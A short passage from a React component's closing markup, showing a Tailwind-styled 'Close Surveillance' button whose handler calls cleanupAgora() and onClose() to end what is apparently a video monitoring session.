              cleanupAgora();
              onClose();
            }}
            className="px-4 py-1.5 bg-slate-200 hover:bg-slate-300 text-slate-700 font-semibold rounded-xl text-xs transition cursor-pointer"
          >
            Close Surveillance
          </button>
        </div>
      </div>
    </div>
  );
}
